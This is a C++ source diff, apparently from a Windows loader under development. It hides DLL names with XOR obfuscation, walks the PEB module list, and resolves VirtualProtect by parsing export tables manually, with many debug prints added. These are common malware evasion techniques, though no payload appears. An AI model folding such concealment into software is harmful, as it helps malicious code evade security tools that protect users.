@@ -35,9 +35,10 @@
 #define X_C(c) static_cast<wchar_t>((c) ^ HEX_K)
 ////////////////////////////////////////////////////////////////////////////////
 
-wchar_t obf_Usr_32[] = { X_C(L'u'), X_C(L's'), X_C(L'e'), X_C(L'r'), X_C(L'3'), X_C(L'2'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
-wchar_t obf_Ker_32[] = { X_C(L'k'), X_C(L'e'), X_C(L'r'), X_C(L'n'), X_C(L'e'), X_C(L'l'), X_C(L'3'), X_C(L'2'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
 wchar_t obf_Ntd_32[] = { X_C(L'n'), X_C(L't'), X_C(L'd'), X_C(L'l'), X_C(L'l'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
+wchar_t obf_Ker_32[] = { X_C(L'k'), X_C(L'e'), X_C(L'r'), X_C(L'n'), X_C(L'e'), X_C(L'l'), X_C(L'3'), X_C(L'2'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
+wchar_t obf_KerB[] = { X_C(L'K'), X_C(L'E'), X_C(L'R'), X_C(L'N'), X_C(L'E'), X_C(L'L'), X_C(L'B'), X_C(L'A'), X_C(L'S'), X_C(L'E'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
+wchar_t obf_Usr_32[] = { X_C(L'u'), X_C(L's'), X_C(L'e'), X_C(L'r'), X_C(L'3'), X_C(L'2'), X_C(L'.'), X_C(L'd'), X_C(L'l'), X_C(L'l'), L'\0'};
 
 ////////////////////////////////////////////////////////////////////////////////
 
@@ -66,6 +67,7 @@ struct _LIBS
 {
     HMODULE hNtdll;
     HMODULE hKERNEL32;
+    HMODULE hKERNELBASE;
     HMODULE hUsr32;
 }sLibs;
 
@@ -98,46 +100,74 @@ int GetFunctions()
     norm("\nLDR ->", CYAN" 0x", std::hex, (void*)pLdr);
     
     //=======================================================================
-
-    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= HEX_K;
-    for (int i = 0; obf_Ker_32[i] != '\0'; i++) obf_Ker_32[i] ^= HEX_K;
+    norm(YELLOW"\n======================================================");
     for (int i = 0; obf_Ntd_32[i] != '\0'; i++) obf_Ntd_32[i] ^= HEX_K;
+    for (int i = 0; obf_Ker_32[i] != '\0'; i++) obf_Ker_32[i] ^= HEX_K;
+    for (int i = 0; obf_KerB[i] != '\0'; i++) obf_KerB[i] ^= HEX_K;
+    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= HEX_K;
     
-    LIST_ENTRY* head = &pLdr->InMemoryOrderModuleList;
-    LIST_ENTRY* current = head->Flink;
+    auto head    = &pLdr->InLoadOrderModuleList;
+    auto current = head->Flink;    // first entry is the EXE itself
+    
+    // walk load‑order
     while (current != head)
     {
-        LDR_DATA_TABLE_ENTRY* entry = ((LDR_DATA_TABLE_ENTRY*)((PCHAR)(current) - (ULONG_PTR)(&((LDR_DATA_TABLE_ENTRY*)0)->InMemoryOrderLinks)));
-        
-        if (entry->BaseDllName.Buffer != nullptr)
+        auto entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+        if (entry->BaseDllName.Buffer)
         {
-            if (_wcsicmp(entry->BaseDllName.Buffer, obf_Ker_32) == 0) sLibs.hKERNEL32 = (HMODULE)entry->DllBase;
-            else if (_wcsicmp(entry->BaseDllName.Buffer, obf_Ntd_32) == 0) sLibs.hNtdll = (HMODULE)entry->DllBase;
-            else if (_wcsicmp(entry->BaseDllName.Buffer, obf_Usr_32) == 0) sLibs.hUsr32 = (HMODULE)entry->DllBase;
+            int len = entry->BaseDllName.Length / sizeof(WCHAR);
+            std::wstring name(entry->BaseDllName.Buffer, len);
+            wprintf(L"\nModule: %.*ls -> " CYAN"0x%p" RESET"", len, entry->BaseDllName.Buffer, entry->DllBase);
+
+            size_t pos = name.find_last_of(L"\\/");
+            std::wstring fileName = (pos == std::wstring::npos) ? name : name.substr(pos + 1);
+
+            wprintf(L"\n[DEBUG] Scanned Module: %ls", fileName.c_str());
+
+            if (_wcsicmp(fileName.c_str(), obf_Ker_32) == 0) sLibs.hKERNEL32 = (HMODULE)entry->DllBase;
+            else if (_wcsicmp(fileName.c_str(), obf_KerB) == 0) sLibs.hKERNELBASE = (HMODULE)entry->DllBase;
+            else if (_wcsicmp(fileName.c_str(), obf_Ntd_32) == 0) sLibs.hNtdll    = (HMODULE)entry->DllBase;
         }
         current = current->Flink;
     }
 
-    for (size_t i = 0; i < wcslen(obf_Usr_32); i++) obf_Usr_32[i] = 0;
-    for (size_t i = 0; i < wcslen(obf_Ker_32); i++) obf_Ker_32[i] = 0;
     for (size_t i = 0; i < wcslen(obf_Ntd_32); i++) obf_Ntd_32[i] = 0;
+    for (size_t i = 0; i < wcslen(obf_Ker_32); i++) obf_Ker_32[i] = 0;
+    for (size_t i = 0; i < wcslen(obf_KerB); i++) obf_KerB[i] = 0;
+    for (size_t i = 0; i < wcslen(obf_Usr_32); i++) obf_Usr_32[i] = 0;
 
-    if(sLibs.hKERNEL32 == 0 || sLibs.hNtdll == 0 || sLibs.hUsr32 == 0)
+    //=======================================================================
+    norm(YELLOW"\n======================================================");
+    printf("\nNTDLL : " CYAN"0x%p" RESET"", sLibs.hNtdll); 
+    printf("\nKernel32 : " CYAN"0x%p" RESET"", sLibs.hKERNEL32);
+    printf("\nKernelBASE32 : " CYAN"0x%p" RESET"", sLibs.hKERNELBASE);
+    norm(YELLOW"\n======================================================");
+    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    if(sLibs.hKERNEL32 == 0 || sLibs.hNtdll == 0)
     {
         norm("\n");fuk("Problems with Dlls");
         return 0;
     }
+    norm("\nNTDLL DOS Header Magic: ", ((IMAGE_DOS_HEADER*)sLibs.hNtdll)->e_magic == 0x5A4D ? "MZ" : "Invalid", "\n");
+    norm("KERNEL32 DOS Header Magic: ", ((IMAGE_DOS_HEADER*)sLibs.hKERNEL32)->e_magic == 0x5A4D ? "MZ" : "Invalid", "\n");
+    norm("KERNELBASE DOS Header Magic: ", ((IMAGE_DOS_HEADER*)sLibs.hKERNELBASE)->e_magic == 0x5A4D ? "MZ" : "Invalid", "\n");
+    norm(YELLOW"======================================================");
+    
+    if (!sLibs.hKERNELBASE)
+    {
+        fuk("hKERNELBASE is null! You never found it in PEB walk!");
+        return 0;
+    }printf("\n[DEBUG] KERNELBASE handle before FindExportAddress: 0x%p", sLibs.hKERNELBASE);
 
-    //=======================================================================
-    norm(YELLOW"\n======================================================");
-    norm("\nKernel32 Base: ", CYAN"0x", std::hex, sLibs.hKERNEL32);
-    norm("\nNTDLL Base: ", CYAN"0x", std::hex, sLibs.hNtdll);
-    norm("\nUsr32 Base: ", CYAN"0x", std::hex, sLibs.hUsr32);
+    fn.MyVirtualProtect = (pVirtualProtect)FindExportAddress(sLibs.hKERNELBASE, "VirtualProtect");
+    if (fn.MyVirtualProtect == nullptr)
+    {
+        fuk("Failed to get VirtualProtect address");
+        return 0;
+    }
 
-    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-norm("!!!!!!!!!!!!!!!!");
-    fn.MyVirtualProtect = (pVirtualProtect)FindExportAddress(sLibs.hKERNEL32, "VirtualProtect");
-norm("@@@@@@@@@@@@@@@@");
     if(!fn.MyVirtualProtect) fuk("No Virtual protek");
     ok("Got Virtual Protek");
 
@@ -707,27 +737,53 @@ int main()
 
 void* FindExportAddress(HMODULE hModule, const char* funcName)
 {
-norm(YELLOW"\n###########################");
+    if (!hModule || !funcName) return nullptr;
 
-    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
-    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
-    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+    BYTE* base = (BYTE*)hModule;
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    DWORD peOffset = dos->e_lfanew;
+    DWORD peSig = *(DWORD*)(base + peOffset);
+    
+    printf("\n[DEBUG] DOS e_lfanew: 0x%X", peOffset);
+    printf("\n[DEBUG] NT Signature: 0x%X", peSig);
 
-    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
-    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
-    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
-norm(YELLOW"\n$$$$$$$$$$$$$$$$$$$$$$$$$$$");
-    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
+    base = (BYTE*)hModule;
+    dos = (IMAGE_DOS_HEADER*)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE){ fuk("Magic did not match"); return nullptr; }
+
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE){ fuk("NT signature did not match"); return nullptr; }
+
+    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (dir.VirtualAddress == 0){ fuk("Optional header issue"); return nullptr; }
+
+    printf("\nExportDir VA: 0x%X, Size: 0x%X", dir.VirtualAddress, dir.Size);
+    printf("\nTrying to resolve: %s", funcName);
+
+    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + dir.VirtualAddress);
+    DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);
+    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
+    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exp->NumberOfNames; ++i)
     {
-        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
-        if (strcmp(funcNameFromExport, funcName) == 0)
+        char* name = (char*)(base + nameRVAs[i]);
+        if (_stricmp(name, funcName) == 0)
         {
-            DWORD funcRVA = funcRVAs[ordRVAs[i]];
-            return (void*)((BYTE*)hModule + funcRVA);
+            DWORD funcRVA = functions[ordinals[i]];
+            BYTE* addr = base + funcRVA;
+
+            // Forwarded export check
+            if (funcRVA >= dir.VirtualAddress && funcRVA < dir.VirtualAddress + dir.Size)
+            {
+                fuk("Forwarded export: ", funcName);
+                return nullptr;
+            }
+
+            return (void*)addr;
         }
     }
 
-    //fuk("Failed to find export address of: ", funcName, "\tGetlastError message -> ", GetLastError(), "\n");
-    fuk("Failed to find export address of: ", funcName, "\tGetlastError message -> \n");
+    fuk("Function not found: ", funcName);
     return nullptr;
 }
